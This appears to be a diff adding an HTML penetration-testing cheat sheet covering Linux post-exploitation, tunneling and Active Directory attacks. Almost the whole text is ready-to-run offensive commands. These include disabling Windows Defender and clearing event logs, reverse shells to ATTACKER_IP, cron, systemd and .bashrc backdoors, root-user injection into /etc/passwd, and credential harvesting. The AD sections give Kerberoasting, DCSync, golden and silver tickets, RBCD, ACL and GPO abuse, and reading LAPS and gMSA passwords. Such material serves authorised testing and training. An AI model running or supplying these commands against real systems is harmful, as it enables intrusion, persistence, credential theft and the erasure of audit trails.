+# Disable Defender via registry
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+
+# Check Defender status
+Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled
+
+# Unmanaged PowerShell (avoid logging)
+# Use C# to host PowerShell runspace — avoids ScriptBlock logging
+# Use PowerShx or similar tool
+
+# Clear event logs (cover tracks — requires admin)
+wevtutil cl Security
+wevtutil cl System
+wevtutil cl Application
+wevtutil cl "Windows PowerShell"
+wevtutil cl "Microsoft-Windows-PowerShell/Operational"
+
+# Timestomping with PowerShell
+$(Get-Item C:\Windows\Temp\payload.exe).CreationTime = "01/01/2023 12:00:00"
+$(Get-Item C:\Windows\Temp\payload.exe).LastWriteTime = "01/01/2023 12:00:00"
+$(Get-Item C:\Windows\Temp\payload.exe).LastAccessTime = "01/01/2023 12:00:00"
+</code></pre>
+
+
+<!-- ============================================================ -->
+<!--  4. POST-EXPLOITATION: LINUX                                 -->
+<!-- ============================================================ -->
+<h2 id="post-linux">4. Post-Exploitation: Linux</h2>
+<p>Enumeration, persistence, and privilege escalation on Linux targets.</p>
+
+<h3 id="pl-enumeration">4.1 Enumeration</h3>
+
+<pre><code class="language-bash"># Basic system info
+id
+uname -a
+cat /etc/os-release
+hostname
+ip a
+ss -tlnp
+
+# Users and groups
+cat /etc/passwd | grep -v nologin | grep -v false
+cat /etc/group
+w
+last -a
+
+# Sudo permissions
+sudo -l
+
+# Interesting files
+find / -perm -4000 -type f 2&gt;/dev/null    # SUID binaries
+find / -perm -2000 -type f 2&gt;/dev/null    # SGID binaries
+find / -writable -type f 2&gt;/dev/null      # World-writable files
+find / -name "*.bak" -o -name "*.old" -o -name "*.conf" 2&gt;/dev/null
+
+# Cron jobs
+cat /etc/crontab
+ls -la /etc/cron.*
+crontab -l
+for u in $(cut -d: -f1 /etc/passwd); do echo "== $u =="; crontab -u $u -l 2&gt;/dev/null; done
+
+# Capabilities
+getcap -r / 2&gt;/dev/null
+
+# Running processes
+ps auxwwf
+
+# Network connections
+ss -tlnp
+ss -ulnp
+cat /etc/hosts
+</code></pre>
+
+<h3 id="pl-reverse-shells">4.2 Reverse Shells</h3>
+
+<pre><code class="language-bash"># Bash reverse shell
+bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/443 0&gt;&amp;1
+
+# Python reverse shell
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
+
+# Perl reverse shell
+perl -e 'use Socket;$i="ATTACKER_IP";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/bash -i");'
+
+# PHP reverse shell
+php -r '$sock=fsockopen("ATTACKER_IP",443);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'
+
+# Upgrade to full TTY
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+# Then Ctrl+Z, then:
+stty raw -echo; fg
+export TERM=xterm
+</code></pre>
+
+<h3 id="pl-persistence">4.3 Persistence</h3>
+
+<pre><code class="language-bash"># SSH key persistence
+mkdir -p ~/.ssh
+echo "ATTACKER_PUBLIC_KEY" &gt;&gt; ~/.ssh/authorized_keys
+chmod 600 ~/.ssh/authorized_keys
+
+# Cron job persistence
+(crontab -l 2&gt;/dev/null; echo "*/5 * * * * /tmp/.backdoor") | crontab -
+
+# Systemd service (requires root)
+cat &gt; /etc/systemd/system/update.service &lt;&lt;'EOF'
+[Unit]
+Description=System Update Service
+
+[Service]
+Type=simple
+ExecStart=/tmp/.backdoor
+Restart=always
+RestartSec=60
+
+[Install]
+WantedBy=multi-user.target
+EOF
+systemctl daemon-reload
+systemctl enable update.service
+systemctl start update.service
+
+# Bashrc persistence
+echo '/tmp/.backdoor &amp;' &gt;&gt; ~/.bashrc
+</code></pre>
+
+<h3 id="pl-privesc">4.4 Privilege Escalation</h3>
+
+<pre><code class="language-bash"># SUID exploitation — check GTFOBins for each binary
+find / -perm -4000 -type f 2&gt;/dev/null
+
+# Common SUID abuses
+# /usr/bin/find with SUID
+find . -exec /bin/bash -p \;
+
+# /usr/bin/python3 with SUID
+python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
+
+# Sudo misconfigurations
+sudo -l
+# Example: (ALL) NOPASSWD: /usr/bin/vim
+sudo vim -c ':!/bin/bash'
+
+# Example: (ALL) NOPASSWD: /usr/bin/env
+sudo env /bin/bash
+
+# Writable /etc/passwd (add root user)
+openssl passwd -1 -salt hacker Password123
+echo 'hacker:$1$hacker$HASH:0:0::/root:/bin/bash' &gt;&gt; /etc/passwd
+
+# Capabilities abuse
+# python3 with cap_setuid
+python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
+# Cron job exploitation — writable script
+echo '#!/bin/bash' &gt; /path/to/cron_script.sh
+echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' &gt;&gt; /path/to/cron_script.sh
+# Wait for cron, then:
+/tmp/rootbash -p
+
+# Kernel exploits — check version
+uname -r
+# Search for exploits matching the kernel version
+
+# Wildcard injection (tar with cron)
+echo "" &gt; "/path/--checkpoint=1"
+echo "" &gt; "/path/--checkpoint-action=exec=sh shell.sh"
+</code></pre>
+
+<h3 id="pl-credential-access">4.5 Credential Access</h3>
+
+<pre><code class="language-bash"># Check for password reuse in config files
+grep -rn "password\|passwd\|credential\|secret" /etc/ /opt/ /var/ /home/ 2&gt;/dev/null
+grep -rn "password\|passwd" /var/www/ 2&gt;/dev/null
+
+# Check for SSH keys
+find / -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2&gt;/dev/null
+find / -name "authorized_keys" 2&gt;/dev/null
+
+# Check .bash_history for credentials
+find /home -name ".bash_history" -exec cat {} \; 2&gt;/dev/null
+cat /root/.bash_history 2&gt;/dev/null
+
+# Database credentials
+cat /var/www/html/wp-config.php 2&gt;/dev/null
+cat /var/www/html/configuration.php 2&gt;/dev/null
+cat /var/www/html/.env 2&gt;/dev/null
+
+# Internal services listening on localhost
+ss -tlnp | grep 127.0.0.1
+# MySQL running locally
+mysql -u root -p
+# Check /etc/mysql/debian.cnf for default creds
+
+# Search for SUID binaries with capabilities
+getcap -r / 2&gt;/dev/null
+# Example: /usr/bin/python3.11 cap_setuid=ep
+python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
+# /etc/shadow (if readable)
+cat /etc/shadow
+# Crack with john
+unshadow /etc/passwd /etc/shadow &gt; unshadowed.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
+</code></pre>
+
+<h3 id="pl-lateral">4.6 Lateral Movement from Linux</h3>
+
+<pre><code class="language-bash"># SSH with stolen keys
+ssh -i stolen_id_rsa user@TARGET_IP
+
+# SSH password spray
+crackmapexec ssh SUBNET/24 -u users.txt -p passwords.txt --no-bruteforce
+
+# Use found credentials on other services
+crackmapexec smb SUBNET/24 -u user -p 'found_password'
+crackmapexec winrm SUBNET/24 -u user -p 'found_password'
+
+# Evil-WinRM from Linux foothold to Windows
+evil-winrm -i TARGET_IP -u user -p 'Password123'
+
+# Impacket through proxy from Linux foothold
+proxychains impacket-psexec corp.local/admin:'Password123'@TARGET_IP
+</code></pre>
+
+
+<!-- ============================================================ -->
+<!--  5. TUNNELING & PIVOTING                                     -->
+<!-- ============================================================ -->
+<h2 id="tunneling-pivoting">5. Tunneling &amp; Pivoting</h2>
+<p>Routing traffic through compromised hosts to reach internal networks.</p>
+
+<h3 id="tp-ssh-tunneling">5.1 SSH Tunneling</h3>
+
+<pre><code class="language-bash"># Local port forward — access INTERNAL_HOST:PORT via localhost:LOCAL_PORT
+ssh -L LOCAL_PORT:INTERNAL_HOST:INTERNAL_PORT user@PIVOT_HOST
+
+# Example: access internal web server (10.10.10.50:80) via localhost:8080
+ssh -L 8080:10.10.10.50:80 user@pivot.corp.local
+
+# Remote port forward — expose attacker listener through pivot
+ssh -R ATTACKER_PORT:127.0.0.1:VICTIM_PORT user@ATTACKER_IP
+
+# Dynamic SOCKS proxy
+ssh -D 1080 user@PIVOT_HOST
+# Then configure proxychains: socks5 127.0.0.1 1080
+
+# SSH through multiple hops
+ssh -J user@hop1,user@hop2 user@final_target
+</code></pre>
+
+<h3 id="tp-ligolo">5.2 Ligolo-ng</h3>
+<p>Ligolo-ng creates a tunneled interface on the attacker machine, avoiding SOCKS overhead.</p>
+
+<pre><code class="language-bash"># === Attacker setup ===
+# Create TUN interface
+sudo ip tuntap add user $(whoami) mode tun ligolo
+sudo ip link set ligolo up
+
+# Start proxy server
+./proxy -selfcert -laddr 0.0.0.0:11601
+
+# === Pivot host (agent) ===
+./agent -connect ATTACKER_IP:11601 -ignore-cert
+
+# === Back on attacker — in ligolo console ===
+# List agents
+session
+# Select agent (e.g., 1)
+# Add route for internal network
+sudo ip route add 10.10.10.0/24 dev ligolo
+# Start tunnel
+start
+</code></pre>
+
+<h3 id="tp-ligolo-double">5.3 Ligolo-ng Double Pivot</h3>
+<p>Pivoting through two hops to reach a third network segment.</p>
+
+<pre><code class="language-bash"># === Setup (attacker already has first pivot running) ===
+# On first pivot agent session in ligolo console:
+listener_add --addr 0.0.0.0:11602 --to 127.0.0.1:11601 --tcp
+
+# Transfer agent binary to second pivot host
+# On second pivot host:
+./agent -connect FIRST_PIVOT_IP:11602 -ignore-cert
+
+# === Back on attacker ===
+# New session appears — select it
+session
+# Add route for the deeper network
+sudo ip route add 172.16.0.0/24 dev ligolo
+# Start tunnel on second session
+start
+</code></pre>
+
+<h3 id="tp-chisel">5.4 Chisel</h3>
+
+<pre><code class="language-bash"># === Attacker: start server ===
+chisel server --reverse --port 8000
+
+# === Pivot host: connect back ===
+# SOCKS proxy
+chisel client ATTACKER_IP:8000 R:1080:socks
+
+# Specific port forward
+chisel client ATTACKER_IP:8000 R:8445:10.10.10.50:445
+</code></pre>
+
+<h3 id="tp-socks-proxy">5.5 SOCKS Proxy &amp; Proxychains</h3>
+
+<pre><code class="language-ini"># /etc/proxychains4.conf
+[ProxyList]
+socks5 127.0.0.1 1080
+</code></pre>
+
+<pre><code class="language-bash"># Use proxychains with tools
+proxychains nmap -sT -Pn -p 445,3389,5985 10.10.10.50
+proxychains crackmapexec smb 10.10.10.0/24
+proxychains evil-winrm -i 10.10.10.50 -u admin -p 'Password123'
+
+# Port forwarding with socat
+socat TCP-LISTEN:8080,fork TCP:INTERNAL_HOST:80
+
+# Port forwarding with netsh (Windows)
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=10.10.10.50
+# Remove when done
+netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
+# List all rules
+netsh interface portproxy show all
+</code></pre>
+
+
+<!-- ============================================================ -->
+<!--  6. ACTIVE DIRECTORY ENUMERATION                             -->
+<!-- ============================================================ -->
+<h2 id="ad-enum">6. Active Directory Enumeration</h2>
+<p>Mapping the domain structure, trusts, ACLs, and attack paths.</p>
+
+<h3 id="ade-net-commands">6.1 Net Commands</h3>
+
+<pre><code class="language-powershell"># Domain info
+net user /domain
+net group /domain
+net group "Domain Admins" /domain
+net group "Enterprise Admins" /domain
+net group "Domain Controllers" /domain
+
+# Specific user details
+net user USERNAME /domain
+
+# Computer accounts
+net group "Domain Computers" /domain
+
+# Trust relationships
+nltest /domain_trusts
+nltest /dclist:corp.local
+
+# Password policy
+net accounts /domain
+</code></pre>
+
+<h3 id="ade-powerview">6.2 PowerView</h3>
+
+<pre><code class="language-powershell"># Import PowerView
+Import-Module .\PowerView.ps1
+
+# Domain enumeration
+Get-Domain
+Get-DomainController
+Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess
+
+# User enumeration
+Get-DomainUser | Select-Object samaccountname, description, memberof
+Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname  # Kerberoastable
+Get-DomainUser -PreauthNotRequired  # AS-REP Roastable
+Get-DomainUser -AdminCount | Select-Object samaccountname
+
+# Group enumeration
+Get-DomainGroup | Select-Object samaccountname
+Get-DomainGroupMember "Domain Admins" -Recurse | Select-Object MemberName
+
+# Computer enumeration
+Get-DomainComputer | Select-Object dnshostname, operatingsystem
+Get-DomainComputer -Unconstrained  # Unconstrained delegation
+
+# Share enumeration
+Find-DomainShare -CheckShareAccess
+
+# GPO enumeration
+Get-DomainGPO | Select-Object DisplayName, gpcfilesyspath
+Get-DomainGPOLocalGroup  # GPOs that modify local groups
+
+# Session enumeration
+Find-DomainUserLocation
+Get-NetSession -ComputerName DC01
+</code></pre>
+
+<h3 id="ade-bloodhound">6.3 SharpHound &amp; BloodHound</h3>
+
+<pre><code class="language-powershell"># SharpHound — collector
+# All collection methods
+.\SharpHound.exe -c All
+
+# Stealth — DCOnly (no direct host contact)
+.\SharpHound.exe -c DCOnly
+
+# PowerShell collector
+Import-Module .\SharpHound.ps1
+Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Windows\Temp
+</code></pre>
+
+<pre><code class="language-bash"># BloodHound Python (remote collection from Linux)
+bloodhound-python -u 'user' -p 'Password123' -d corp.local -ns DC_IP -c All
+
+# Start BloodHound
+sudo neo4j start
+bloodhound
+
+# Key queries in BloodHound:
+# - Shortest Path to Domain Admins
+# - Find All Kerberoastable Users
+# - Find AS-REP Roastable Users
+# - Shortest Path from Owned Principals
+# - Find Computers with Unconstrained Delegation
+</code></pre>
+
+<h3 id="ade-ldapsearch">6.4 LDAP Enumeration</h3>
+
+<pre><code class="language-bash"># Basic domain enumeration
+ldapsearch -x -H ldap://DC_IP -D "user@corp.local" -w 'Password123' \
+  -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName description memberOf
+
+# Find Kerberoastable accounts
+ldapsearch -x -H ldap://DC_IP -D "user@corp.local" -w 'Password123' \
+  -b "DC=corp,DC=local" "(&amp;(objectClass=user)(servicePrincipalName=*))" \
+  sAMAccountName servicePrincipalName
+
+# Find AS-REP Roastable accounts
+ldapsearch -x -H ldap://DC_IP -D "user@corp.local" -w 'Password123' \
+  -b "DC=corp,DC=local" "(&amp;(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
+  sAMAccountName
+
+# Enumerate domain trusts
+ldapsearch -x -H ldap://DC_IP -D "user@corp.local" -w 'Password123' \
+  -b "DC=corp,DC=local" "(objectClass=trustedDomain)" cn trustDirection trustType
+
+# Enumerate computers
+ldapsearch -x -H ldap://DC_IP -D "user@corp.local" -w 'Password123' \
+  -b "DC=corp,DC=local" "(objectClass=computer)" cn operatingSystem dNSHostName
+</code></pre>
+
+<h3 id="ade-acl">6.5 ACL Enumeration</h3>
+
+<pre><code class="language-powershell"># Find interesting ACLs with PowerView
+Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {
+  $_.IdentityReferenceName -match "user|group_we_control"
+}
+
+# Check specific object ACL
+Get-DomainObjectAcl -Identity "TARGET_USER" -ResolveGUIDs |
+  Where-Object { $_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner|GenericWrite|ForceChangePassword" } |
+  Select-Object SecurityIdentifier, ActiveDirectoryRights, ObjectAceType
+
+# Convert SID to name
+ConvertFrom-SID S-1-5-21-...
+
+# Find users with DCSync rights
+Get-DomainObjectAcl "DC=corp,DC=local" -ResolveGUIDs |
+  Where-Object {
+    ($_.ObjectAceType -match "Replicating-Directory-Changes") -and
+    ($_.ActiveDirectoryRights -match "ExtendedRight")
+  } | Select-Object SecurityIdentifier
+</code></pre>
+
+<h3 id="ade-trust-mapping">6.6 Trust Mapping</h3>
+
+<pre><code class="language-powershell"># PowerView trust enumeration
+Get-DomainTrust
+Get-DomainTrust -Domain child.corp.local
+Get-ForestDomain
+Get-ForestTrust
+
+# Map trust directions
+Get-DomainTrust | Select-Object SourceName, TargetName, TrustDirection, TrustType
+
+# Enumerate foreign group memberships
+Get-DomainForeignGroupMember -Domain corp.local
+Get-DomainForeignUser -Domain corp.local
+</code></pre>
+
+<pre><code class="language-bash"># From Linux
+crackmapexec smb DC_IP -u user -p 'Password123' -M enum_trusts
+</code></pre>
+
+
+<!-- ============================================================ -->
+<!--  7. ACTIVE DIRECTORY EXPLOITATION                            -->
+<!-- ============================================================ -->
+<h2 id="ad-exploit">7. Active Directory Exploitation</h2>
+<p>Attacking AD authentication, delegation, and access control weaknesses.</p>
+
+<h3 id="adx-kerberoasting">7.1 Kerberoasting</h3>
+
+<pre><code class="language-bash"># Impacket — request TGS for all SPNs
+impacket-GetUserSPNs corp.local/user:'Password123' -dc-ip DC_IP -request -outputfile kerberoast.txt
+
+# Crack with hashcat
+hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
+
+# Crack with john
+john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast.txt
+</code></pre>
+
+<pre><code class="language-powershell"># Rubeus — from Windows
+.\Rubeus.exe kerberoast /outfile:kerberoast.txt
+
+# Target specific user
+.\Rubeus.exe kerberoast /user:svc_sql /outfile:kerberoast.txt
+</code></pre>
+
+<h3 id="adx-asrep">7.2 AS-REP Roasting</h3>
+
+<pre><code class="language-bash"># Impacket — no password required for target users
+impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip DC_IP -format hashcat -outputfile asrep.txt
+
+# With valid creds — auto-find vulnerable users
+impacket-GetNPUsers corp.local/user:'Password123' -dc-ip DC_IP -request -outputfile asrep.txt
+
+# Crack
+hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
+</code></pre>
+
+<pre><code class="language-powershell"># Rubeus
+.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
+</code></pre>
+
+<h3 id="adx-unconstrained-delegation">7.3 Unconstrained Delegation</h3>
+
+<pre><code class="language-powershell"># Find computers with unconstrained delegation
+Get-DomainComputer -Unconstrained | Select-Object dnshostname
+
+# Monitor for incoming TGTs (Rubeus on the unconstrained host)
+.\Rubeus.exe monitor /interval:5 /nowrap
+
+# Coerce authentication (e.g., PrinterBug/SpoolSample)
+.\SpoolSample.exe DC01.corp.local UNCONSTRAINED_HOST.corp.local
+
+# Use captured TGT
+.\Rubeus.exe ptt /ticket:BASE64_TICKET
+</code></pre>
+
+<h3 id="adx-constrained-delegation">7.4 Constrained Delegation</h3>
+
+<pre><code class="language-powershell"># Find accounts with constrained delegation
+Get-DomainUser -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto
+Get-DomainComputer -TrustedToAuth | Select-Object dnshostname, msds-allowedtodelegateto
+</code></pre>
+
+<pre><code class="language-bash"># Impacket — request ticket using S4U
+# Get TGT for the service account
+impacket-getST corp.local/svc_web:'Password123' -spn cifs/TARGET.corp.local \
+  -impersonate Administrator -dc-ip DC_IP
+
+# Use the ticket
+export KRB5CCNAME=Administrator@cifs_TARGET.corp.local@CORP.LOCAL.ccache
+impacket-psexec -k -no-pass corp.local/Administrator@TARGET.corp.local
+</code></pre>
+
+<pre><code class="language-powershell"># Rubeus — S4U chain
+.\Rubeus.exe s4u /user:svc_web /rc4:NTLM_HASH /impersonateuser:Administrator \
+  /msdsspn:cifs/TARGET.corp.local /ptt
+</code></pre>
+
+<h3 id="adx-dcsync">7.5 DCSync</h3>
+
+<pre><code class="language-bash"># Impacket — dump all hashes
+impacket-secretsdump corp.local/da_user:'Password123'@DC_IP
+
+# Dump specific user
+impacket-secretsdump corp.local/da_user:'Password123'@DC_IP -just-dc-user krbtgt
+
+# Using NTLM hash
+impacket-secretsdump -hashes :NTLM_HASH corp.local/da_user@DC_IP
+</code></pre>
+
+<pre><code class="language-powershell"># Mimikatz
+mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" "exit"
+mimikatz.exe "lsadump::dcsync /domain:corp.local /all /csv" "exit"
+</code></pre>
+
+<h3 id="adx-golden-ticket">7.6 Golden Ticket</h3>
+
+<pre><code class="language-bash"># Impacket — create golden ticket
+impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain corp.local Administrator
+
+# Use the ticket
+export KRB5CCNAME=Administrator.ccache
+impacket-psexec -k -no-pass corp.local/Administrator@DC01.corp.local
+</code></pre>
+
+<pre><code class="language-powershell"># Mimikatz
+mimikatz.exe "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /ptt" "exit"
+
+# Verify
+klist
+dir \\DC01\C$
+</code></pre>
+
+<h3 id="adx-silver-ticket">7.7 Silver Ticket</h3>
+
+<pre><code class="language-bash"># Impacket — silver ticket for CIFS
+impacket-ticketer -nthash SERVICE_NTLM_HASH -domain-sid S-1-5-21-... \
+  -domain corp.local -spn cifs/TARGET.corp.local Administrator
+
+export KRB5CCNAME=Administrator.ccache
+impacket-smbclient -k -no-pass corp.local/Administrator@TARGET.corp.local
+</code></pre>
+
+<pre><code class="language-powershell"># Mimikatz — silver ticket for CIFS
+mimikatz.exe "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /target:TARGET.corp.local /service:cifs /rc4:SERVICE_HASH /ptt" "exit"
+</code></pre>
+
+<h3 id="adx-rbcd">7.8 Resource-Based Constrained Delegation (RBCD)</h3>
+
+<pre><code class="language-bash"># Prerequisites: control an account with SPN (or create a machine account)
+# Create machine account (if MachineAccountQuota &gt; 0)
+impacket-addcomputer corp.local/user:'Password123' -computer-name 'FAKE01$' -computer-pass 'FakePass123' -dc-ip DC_IP
+
+# Set msDS-AllowedToActOnBehalfOfOtherIdentity on target
+impacket-rbcd corp.local/user:'Password123' -delegate-from 'FAKE01$' -delegate-to 'TARGET$' -dc-ip DC_IP -action write
+
+# Get impersonation ticket via S4U
+impacket-getST corp.local/'FAKE01$':'FakePass123' -spn cifs/TARGET.corp.local \
+  -impersonate Administrator -dc-ip DC_IP
+
+# Use ticket
+export KRB5CCNAME=Administrator@cifs_TARGET.corp.local@CORP.LOCAL.ccache
+impacket-psexec -k -no-pass corp.local/Administrator@TARGET.corp.local
+</code></pre>
+
+<pre><code class="language-powershell"># PowerShell / PowerView approach
+# Create machine account
+New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString 'FakePass123' -AsPlainText -Force)
+
+# Set RBCD
+$sid = Get-DomainComputer FAKE01 -Properties objectsid | Select-Object -ExpandProperty objectsid
+$sd = New-Object Security.AccessControl.RawSecurityDescriptor("O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)")
+$sdBytes = New-Object byte[] ($sd.BinaryLength)
+$sd.GetBinaryForm($sdBytes, 0)
+Set-DomainObject TARGET$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$sdBytes}
+</code></pre>
+
+<h3 id="adx-shadow-creds">7.9 Shadow Credentials</h3>
+
+<pre><code class="language-bash"># Pywhisker — add shadow credentials to target
+python3 pywhisker.py -d corp.local -u user -p 'Password123' \
+  --target TARGET_USER --action add --dc-ip DC_IP
+
+# Extract the certificate and use with PKINITtools
+python3 gettgtpkinit.py corp.local/TARGET_USER -cert-pfx CERT.pfx -pfx-pass PASSWORD cert.ccache
+
+# Get NT hash from TGT
+export KRB5CCNAME=cert.ccache
+python3 getnthash.py corp.local/TARGET_USER -key AS_REP_KEY
+</code></pre>
+
+<pre><code class="language-powershell"># Whisker (C#)
+.\Whisker.exe add /target:TARGET_USER /domain:corp.local /dc:DC01.corp.local
+
+# Use output with Rubeus
+.\Rubeus.exe asktgt /user:TARGET_USER /certificate:BASE64_CERT /password:CERT_PASS /ptt
+</code></pre>
+
+<h3 id="adx-acl-abuse">7.10 ACL Abuse</h3>
+
+<table class="table table-bordered table-dark table-striped">
+  <thead>
+    <tr>
+      <th>ACL Right</th>
+      <th>Abuse</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>GenericAll</td>
+      <td>Full control &mdash; reset password, set SPN, modify membership, write shadow credentials</td>
+    </tr>
+    <tr>
+      <td>GenericWrite</td>
+      <td>Write any attribute &mdash; set SPN for Kerberoasting, write shadow credentials</td>
+    </tr>
+    <tr>
+      <td>WriteDacl</td>
+      <td>Modify ACL &mdash; grant yourself GenericAll, then abuse</td>
+    </tr>
+    <tr>
+      <td>WriteOwner</td>
+      <td>Change object owner &mdash; set yourself, then WriteDacl</td>
+    </tr>
+    <tr>
+      <td>ForceChangePassword</td>
+      <td>Reset target password without knowing current one</td>
+    </tr>
+    <tr>
+      <td>AddMember</td>
+      <td>Add yourself/controlled user to a group</td>
+    </tr>
+    <tr>
+      <td>AllExtendedRights</td>
+      <td>Includes ForceChangePassword + ability to read LAPS passwords</td>
+    </tr>
+  </tbody>
+</table>
+
+<pre><code class="language-powershell"># GenericAll on user — reset password
+net user TARGET_USER NewPassword123! /domain
+
+# GenericAll on user — targeted Kerberoasting (set SPN)
+Set-DomainObject -Identity TARGET_USER -Set @{serviceprincipalname='fake/kerberoast'}
+.\Rubeus.exe kerberoast /user:TARGET_USER /outfile:hash.txt
+# Clean up
+Set-DomainObject -Identity TARGET_USER -Clear serviceprincipalname
+
+# GenericAll on group — add self to group
+Add-DomainGroupMember -Identity "Domain Admins" -Members controlled_user
+
+# WriteDacl — grant GenericAll to self
+Add-DomainObjectAcl -TargetIdentity TARGET_USER -PrincipalIdentity controlled_user -Rights All
+
+# WriteOwner — take ownership then WriteDacl
+Set-DomainObjectOwner -Identity TARGET_USER -OwnerIdentity controlled_user
+Add-DomainObjectAcl -TargetIdentity TARGET_USER -PrincipalIdentity controlled_user -Rights All
+
+# ForceChangePassword
+$newpw = ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force
+Set-DomainUserPassword -Identity TARGET_USER -AccountPassword $newpw
+</code></pre>
+
+<pre><code class="language-bash"># From Linux with BloodyAD
+bloodyAD -d corp.local -u user -p 'Password123' --host DC_IP set password TARGET_USER 'NewPassword123!'
+bloodyAD -d corp.local -u user -p 'Password123' --host DC_IP add groupMember "Domain Admins" controlled_user
+bloodyAD -d corp.local -u user -p 'Password123' --host DC_IP add genericAll 'OU=Users,DC=corp,DC=local' controlled_user
+
+# Dacledit (Impacket fork)
+impacket-dacledit corp.local/user:'Password123' -action write -rights FullControl \
+  -principal controlled_user -target TARGET_USER -dc-ip DC_IP
+</code></pre>
+
+<h3 id="adx-gpo-abuse">7.11 GPO Abuse</h3>
+
+<pre><code class="language-powershell"># Check writable GPOs
+Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs |
+  Where-Object { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty" } |
+  Select-Object ObjectDN, SecurityIdentifier, ActiveDirectoryRights
+
+# SharpGPOAbuse — add local admin via GPO
+.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount controlled_user --GPOName "Default Domain Policy"
+
+# SharpGPOAbuse — add scheduled task via GPO
+.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author "NT AUTHORITY\SYSTEM" \
+  --Command "cmd.exe" --Arguments "/c C:\Windows\Temp\payload.exe" --GPOName "Vulnerable GPO"
+
+# Force GPO update
+gpupdate /force
+</code></pre>
+
+<pre><code class="language-bash"># From Linux — pyGPOAbuse
+python3 pygpoabuse.py corp.local/user:'Password123' -gpo-id "GPO_GUID" \
+  -f cmd -c "net localgroup administrators controlled_user /add" -dc-ip DC_IP
+</code></pre>
+
+<h3 id="adx-cross-trust">7.12 Cross-Trust Attacks</h3>
+
+<pre><code class="language-powershell"># Child-to-parent domain escalation (SID History / Golden Ticket)
+# Get child domain krbtgt hash + Enterprise Admins SID
+mimikatz.exe "lsadump::dcsync /domain:child.corp.local /user:krbtgt" "exit"
+
+# Get Enterprise Admins SID from parent domain
+Get-DomainGroup -Identity "Enterprise Admins" -Domain corp.local |
+  Select-Object objectsid
+
+# Create inter-realm golden ticket
+mimikatz.exe "kerberos::golden /user:Administrator /domain:child.corp.local /sid:CHILD_DOMAIN_SID /krbtgt:CHILD_KRBTGT_HASH /sids:ENTERPRISE_ADMINS_SID /ptt" "exit"
+
+# Access parent domain DC
+dir \\parent-dc.corp.local\C$
+</code></pre>
+
+<pre><code class="language-bash"># Impacket — inter-realm golden ticket
+impacket-ticketer -nthash CHILD_KRBTGT_HASH -domain child.corp.local \
+  -domain-sid CHILD_SID -extra-sid ENTERPRISE_ADMINS_SID Administrator
+
+export KRB5CCNAME=Administrator.ccache
+impacket-psexec -k -no-pass child.corp.local/Administrator@parent-dc.corp.local
+
+# Trust ticket forging
+impacket-ticketer -nthash TRUST_KEY -domain child.corp.local \
+  -domain-sid CHILD_SID -extra-sid ENTERPRISE_ADMINS_SID \
+  -spn krbtgt/CORP.LOCAL Administrator
+</code></pre>
+
+<h3 id="adx-laps">7.13 LAPS &amp; gMSA</h3>
+
+<pre><code class="language-powershell"># Read LAPS passwords (if ACL permits)
+Get-DomainComputer -Identity TARGET$ -Properties ms-Mcs-AdmPwd | Select-Object ms-Mcs-AdmPwd
+
+# PowerView — find computers with LAPS
+Get-DomainComputer -Properties cn,ms-Mcs-AdmPwd | Where-Object { $_.'ms-Mcs-AdmPwd' }
+
+# Read LAPS via CrackMapExec
+crackmapexec ldap DC_IP -u user -p 'Password123' -M laps
+</code></pre>
+
+<pre><code class="language-bash"># Read gMSA password
+bloodyAD -d corp.local -u user -p 'Password123' --host DC_IP get object 'GMSA_ACCOUNT$' --attr msDS-ManagedPassword
+
+# gMSADumper
+python3 gMSADumper.py -u user -p 'Password123' -d corp.local -l DC_IP
+
+# Impacket
+impacket-ntlmrelayx -t ldaps://DC_IP --dump-gmsa
+</code></pre>
+
+
+<!-- ============================================================ -->
